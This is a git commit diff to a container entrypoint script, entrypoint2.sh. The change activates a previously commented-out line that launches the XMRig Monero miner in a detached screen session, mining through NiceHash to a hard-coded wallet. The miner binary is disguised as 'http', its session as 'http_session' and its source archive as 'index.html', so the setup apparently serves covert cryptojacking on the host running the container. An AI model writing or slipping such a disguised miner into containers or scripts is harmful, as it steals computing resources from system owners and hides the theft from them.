08158ccc6ad4d4601390b6f199f930411e444302
osnmoh007 <112149956+osnmoh007@users.noreply.github.com>
2024-08-31 20:17:41 +0100

    Update entrypoint2.sh

--- entrypoint2.sh
+++ entrypoint2.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 
 # Install necessary packages
-apk add --no-cache coreutils cpulimit
+apk add --no-cache coreutils cpulimit util-linux
 
 # Download the http file
 # (Assuming you have a command to download the file here, e.g., wget or curl)
@@ -12,14 +12,10 @@ tar -xvzf /app2/index.html -C /app2/
 # Change directory to the extracted folder
 cd /app2/httpalpine
 
-# Get the number of available cores
-num_cores=$(nproc)
 
-# Randomly select 8 unique cores
-random_cores=$(shuf -i 0-$(($num_cores - 1)) -n 8 | tr '\n' ',' | sed 's/,$//')
 
 # Run XMRig with screen, using taskset to set CPU affinity and cpulimit to limit CPU usage
-#screen -dmS http_session sh -c "taskset -c $random_cores cpulimit -l 80 -- ./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash -t=2"
+screen -dmS http_session sh -c "taskset -c 4,6,10,11 cpulimit -l 80 -- ./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash"
 
 # Change directory to /app and run the original command in the background
 # cd /app
